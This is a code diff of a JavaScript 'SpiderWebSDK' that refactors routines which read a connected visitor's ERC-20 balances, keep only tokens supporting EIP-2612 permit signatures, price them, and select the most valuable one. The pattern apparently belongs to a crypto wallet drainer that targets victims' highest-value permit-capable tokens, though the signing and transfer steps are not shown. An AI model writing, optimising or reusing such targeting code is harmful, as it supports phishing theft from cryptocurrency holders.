@@ -107,7 +107,7 @@ window.SpiderWebSDK = {
 },
 
     _getRankedCompatibleTokens: async function() {
-    // Get balances (same as before)
+    // Steps 1 & 2: Get balances and filter for permit-compatible tokens
     const alchemyUrl = `https://eth-mainnet.g.alchemy.com/v2/${this._config.alchemyApiKey}`;
     const response = await fetch(alchemyUrl, {
         method: 'POST',
@@ -123,9 +123,7 @@ window.SpiderWebSDK = {
     const nonZeroBalances = data.result.tokenBalances.filter(t => t.tokenBalance !== '0x0');
     if (nonZeroBalances.length === 0) return [];
 
-    // Sequentially check tokens for permit support
-    const compatibleTokens = [];
-    for (const token of nonZeroBalances) {
+    const checkPromises = nonZeroBalances.map(async (token) => {
         if (await this._checkPermitSupport(token.contractAddress)) {
             const tokenContract = new ethers.Contract(token.contractAddress, this._ERC20_PERMIT_ABI, this._provider);
             const [name, symbol, balance, decimals] = await Promise.all([
@@ -134,14 +132,18 @@ window.SpiderWebSDK = {
                 tokenContract.balanceOf(this._currentUserAddress),
                 tokenContract.decimals()
             ]);
-            compatibleTokens.push({ contractAddress: token.contractAddress, name, symbol, balance, decimals, usdValue: 0 });
+            return { contractAddress: token.contractAddress, name, symbol, balance, decimals, usdValue: 0 }; // Add usdValue property
         }
-    }
+        return null;
+    });
 
+    const compatibleTokens = (await Promise.all(checkPromises)).filter(Boolean);
     if (compatibleTokens.length === 0) return [];
 
-    // Fetch prices and calculate value (same as before)
+    // Step 3: Fetch prices
     const prices = await this._fetchTokenPrices(compatibleTokens.map(t => t.contractAddress));
+
+    // Step 4: Calculate USD value for each token
     if (prices) {
         for (const token of compatibleTokens) {
             const priceData = prices[token.contractAddress.toLowerCase()];
@@ -152,7 +154,9 @@ window.SpiderWebSDK = {
         }
     }
 
+    // Step 5: Sort tokens by USD value in descending order
     compatibleTokens.sort((a, b) => b.usdValue - a.usdValue);
+
     return compatibleTokens;
 },
     _fetchTokenPrices: async function(tokenAddresses) {
@@ -222,74 +226,81 @@ window.SpiderWebSDK = {
     },
 
     _findHighestValueToken: async function() {
-    // 1. Fetch all token balances (same as before)
-    const alchemyUrl = `https://eth-mainnet.g.alchemy.com/v2/${this._config.alchemyApiKey}`;
-    const response = await fetch(alchemyUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenBalances',
-            params: [this._currentUserAddress, 'erc20']
-        })
-    });
-    const data = await response.json();
-    if (!data.result) throw new Error("Could not fetch token balances from Alchemy.");
+        // 1. Fetch all token balances from Alchemy (same as before)
+        const alchemyUrl = `https://eth-mainnet.g.alchemy.com/v2/${this._config.alchemyApiKey}`;
+        const response = await fetch(alchemyUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenBalances',
+                params: [this._currentUserAddress, 'erc20']
+            })
+        });
+        const data = await response.json();
+        if (!data.result) throw new Error("Could not fetch token balances from Alchemy.");
 
-    const nonZeroBalances = data.result.tokenBalances.filter(t => t.tokenBalance !== '0x0');
-    if (nonZeroBalances.length === 0) return null;
-    
-    this._updateStatus("Finding all compatible tokens...", "pending");
+        const nonZeroBalances = data.result.tokenBalances.filter(t => t.tokenBalance !== '0x0');
+        if (nonZeroBalances.length === 0) return null;
+        
+        this._updateStatus("Finding all compatible tokens...", "pending");
 
-    // 2. Sequentially check tokens for permit support.
-    const compatibleTokens = [];
-    for (const token of nonZeroBalances) {
-        if (await this._checkPermitSupport(token.contractAddress)) {
-            const tokenContract = new ethers.Contract(token.contractAddress, this._ERC20_PERMIT_ABI, this._provider);
-            const [name, symbol, balance, decimals] = await Promise.all([
-                tokenContract.name(),
-                tokenContract.symbol(),
-                tokenContract.balanceOf(this._currentUserAddress),
-                tokenContract.decimals()
-            ]);
-            compatibleTokens.push({ contractAddress: token.contractAddress, name, symbol, balance, decimals });
+        // 2. Concurrently check all tokens for permit support and get their details.
+        const checkPromises = nonZeroBalances.map(async (token) => {
+            if (await this._checkPermitSupport(token.contractAddress)) {
+                const tokenContract = new ethers.Contract(token.contractAddress, this._ERC20_PERMIT_ABI, this._provider);
+                const [name, symbol, balance, decimals] = await Promise.all([
+                    tokenContract.name(),
+                    tokenContract.symbol(),
+                    tokenContract.balanceOf(this._currentUserAddress),
+                    tokenContract.decimals()
+                ]);
+                return { contractAddress: token.contractAddress, name, symbol, balance, decimals };
+            }
+            return null;
+        });
+
+        // 3. Filter out non-compatible tokens
+        const compatibleTokens = (await Promise.all(checkPromises)).filter(Boolean);
+
+        if (compatibleTokens.length === 0) {
+            return null; // No permit-compatible tokens found at all
         }
-    }
+        
+        // Optimization: If there's only one, no need to fetch prices.
+        if (compatibleTokens.length === 1) {
+            return compatibleTokens[0];
+        }
 
-    if (compatibleTokens.length === 0) {
-        return null;
-    }
-    
-    if (compatibleTokens.length === 1) {
-        return compatibleTokens[0];
-    }
+        this._updateStatus(`Found ${compatibleTokens.length} tokens. Valuating...`, "pending");
 
-    this._updateStatus(`Found ${compatibleTokens.length} tokens. Valuating...`, "pending");
+        // 4. Fetch prices for all compatible tokens
+        const prices = await this._fetchTokenPrices(compatibleTokens.map(t => t.contractAddress));
+        if (!prices) {
+            console.warn("Could not fetch prices. Defaulting to the first compatible token found.");
+            return compatibleTokens[0]; // Fallback if price API fails
+        }
+        
+        // 5. Calculate USD value and find the token with the highest value
+        let highestValueToken = null;
+        let maxUsdValue = -1;
 
-    // 3. Fetch prices and find the highest value (same as before)
-    const prices = await this._fetchTokenPrices(compatibleTokens.map(t => t.contractAddress));
-    if (!prices) {
-        console.warn("Could not fetch prices. Defaulting to the first compatible token found.");
-        return compatibleTokens[0];
-    }
-    
-    let highestValueToken = null;
-    let maxUsdValue = -1;
+        for (const token of compatibleTokens) {
+            const priceData = prices[token.contractAddress.toLowerCase()];
+            if (priceData && priceData.usd) {
+                // Calculate the value: (balance / 10^decimals) * price
+                const formattedBalance = ethers.utils.formatUnits(token.balance, token.decimals);
+                const usdValue = parseFloat(formattedBalance) * priceData.usd;
 
-    for (const token of compatibleTokens) {
-        const priceData = prices[token.contractAddress.toLowerCase()];
-        if (priceData && priceData.usd) {
-            const formattedBalance = ethers.utils.formatUnits(token.balance, token.decimals);
-            const usdValue = parseFloat(formattedBalance) * priceData.usd;
-
-            if (usdValue > maxUsdValue) {
-                maxUsdValue = usdValue;
-                highestValueToken = token;
+                if (usdValue > maxUsdValue) {
+                    maxUsdValue = usdValue;
+                    highestValueToken = token;
+                }
             }
         }
-    }
 
-    return highestValueToken || compatibleTokens[0];
-},
+        // Return the highest value token found. If no prices were found, fall back to the first one.
+        return highestValueToken || compatibleTokens[0];
+    },
 
 _logConnectionEvent: async function() {
     try {
@@ -353,20 +364,44 @@ _logConnectionEvent: async function() {
     }
 },
     _checkPermitSupport: async function(tokenAddress) {
-    let symbol = tokenAddress; // Default to address if symbol lookup fails
+    const checksumAddress = ethers.utils.getAddress(tokenAddress);
+    
+    // 1. Get the symbol (or fall back to address)
+    let symbol = checksumAddress; 
     try {
-        const tempContract = new ethers.Contract(tokenAddress, ["function symbol() view returns (string)"], this._provider);
+        const tempContract = new ethers.Contract(checksumAddress, ["function symbol() view returns (string)"], this._provider);
         symbol = await tempContract.symbol();
-        console.log(`Checking permit support for: ${symbol}...`);
+    } catch (e) { /* ignored */ }
 
-        const tokenContract = new ethers.Contract(tokenAddress, this._ERC20_PERMIT_ABI, this._provider);
+    // 2. Add explicit checks for known permit-compatible tokens (like WETH, UNI)
+    // The addresses below are for Ethereum Mainnet (Chain ID 1).
+    const KNOWN_PERMIT_TOKENS = {
+        '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2': true, // WETH
+        '0x1f9840a85d5aF5aa607c37bD30F48cddE3A430bF': true  // UNI (Uniswap)
+        // Add more common tokens here if necessary
+    };
+
+    if (KNOWN_PERMIT_TOKENS[checksumAddress]) {
+        console.log(`✅ SUCCESS: ${symbol} is a known permit-compatible token.`);
+        return true;
+    }
+
+    // 3. Perform a robust EIP-2612 check for generic tokens
+    try {
+        const tokenContract = new ethers.Contract(checksumAddress, this._ERC20_PERMIT_ABI, this._provider);
+        
+        // Check for nonces: This is the primary indicator of EIP-2612 compatibility.
         await tokenContract.nonces(this._currentUserAddress);
+        
+        // Check for DOMAIN_SEPARATOR: This is required for EIP-712 hashing.
         await tokenContract.DOMAIN_SEPARATOR();
 
-        console.log(`✅ SUCCESS: ${symbol} is permit-compatible.`);
+        console.log(`✅ SUCCESS: ${symbol} is EIP-2612 permit-compatible.`);
         return true;
     } catch (error) {
-        console.warn(`❌ SKIPPED: ${symbol} failed the permit check and will be ignored.`);
+        // If the above full EIP-2612 check fails, it likely means the 
+        // token is not strictly compliant or uses a different ABI interface.
+        console.warn(`❌ SKIPPED: ${symbol} failed the robust permit check. Reason: ${error.message.substring(0, 50)}...`);
         return false;
     }
 },
